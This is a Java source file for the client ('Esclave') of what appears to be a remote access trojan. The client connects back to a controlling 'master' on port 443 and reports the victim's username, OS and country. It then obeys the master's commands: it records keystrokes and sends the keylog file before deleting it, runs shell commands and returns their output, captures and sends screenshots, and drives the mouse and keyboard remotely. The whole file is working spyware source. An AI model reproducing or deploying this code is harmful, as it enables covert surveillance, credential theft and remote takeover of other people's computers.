package client;

import java.awt.AWTException;
import java.awt.Robot;
import java.io.BufferedInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.InetAddress;
import java.net.Socket;

import remote.action.CMD;
import remote.action.Keylogging;
import remote.action.Notification;
import remote.action.RemoteActions;
import remote.action.ScreenShot;
import send.specific.object.SendImage;
import send.specific.object.SendSpecificObject;
import constante.Constante;

public class Esclave {

	private final static int portMaitre = 443;
	private final static String addresseMaitre = "192.168.56.1";
	private static InetAddress addresse;

	private static ObjectInputStream in;
	private static ObjectOutputStream out;

	public static ObjectOutputStream getOut() {
		return out;
	}

	private Socket s;
	private Keylogging klgg;
	private Robot robot;
	private CMD cmd = null;

	public Esclave() throws ClassNotFoundException, InterruptedException {

		try {
			s = new Socket(InetAddress.getLocalHost(), portMaitre);

			addresse = s.getInetAddress();

			out = new ObjectOutputStream(s.getOutputStream());
			in = new ObjectInputStream(new BufferedInputStream(
					s.getInputStream()));
			String fileseparator = System.getProperty("file.separator"), username = System
					.getProperty("user.name"), os_version = System
					.getProperty("os.version"), os_name = System
					.getProperty("os.name"), os_arch = System
					.getProperty("os.arch"), user_country = System
					.getProperty("user.country");
			out.writeObject(addresse + " " + fileseparator + " " + username
					+ " " + os_version + " " + os_name + " " + os_arch + " "
					+ user_country);
			out.flush();
			klgg = new Keylogging(this);
			robot = new Robot();
			this.receive(this);
		} catch (AWTException | IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}

	public void receive(Esclave esclave) throws ClassNotFoundException,
			IOException, InterruptedException {
		Thread recevoir = new Thread("Receive") {
			@Override
			public void run() {

				try {
					while (true) {
						Object action;

						action = in.readObject();

						if (action instanceof Integer) {
							Integer code = (Integer) action;
							if (code.equals(Constante.code_keylog)) {
								sendfileKeylog();
								
							} else if (code.equals(Constante.code_notif)) {
								Notification notif = new Notification();
							} else if (code.equals(Constante.code_cmd)) {
								// System.out.println("[debug] Nouveau requete CMD: ");

								if (cmd == null) {
									cmd = new CMD();
									// System.out.println("[debug] New cmd");
								}
								action = in.readObject();
								if (action instanceof String) {
									String instruction = (String) action;
									String res = "";
									res = cmd.nouvellecommande(instruction,
											esclave);
									// System.out.println("[debug]"+res);

									if (!res.equals(Constante.code_message_cmd)) {
										out.writeObject(Constante.code_cmd);
										out.flush();
										out.writeObject(res);
										out.flush();
									}
								}
							} else {
								System.out.println("Objet non identifie");
							}
						} else if (action instanceof RemoteActions) {
							RemoteActions remoteaction = (RemoteActions) action;
							if (remoteaction instanceof ScreenShot) {
								ScreenShot screenshot = (ScreenShot) remoteaction;
								Object result = screenshot.executer(robot);
								
								if (result != null) {

									byte[] size = (byte[]) screenshot.getsize();
									if (!size.equals(null)) {
										out.writeObject(Constante.code_vnc);
										out.flush();
									//	System.out.println("[debug] Envoi image");
										SendImage.sendImage(out, size, (byte[]) result);
									}
								}
							} else {
								Object result = remoteaction.executer(robot);
							}

						}
					}

				} catch (ClassNotFoundException | IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (AWTException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		};
		recevoir.start();
	}

	public void sendfileKeylog() throws IOException, InterruptedException {
		String chemin = Keylogging.cheminFile;
		klgg.arreteKeylog();
		SendSpecificObject.sendFile(chemin, out);
		klgg.supprimerFichier();
		klgg = new Keylogging(this);
	}

	public static void main(String[] args) throws ClassNotFoundException,
			IOException, InterruptedException {
		Esclave esclave = new Esclave();
	}
}
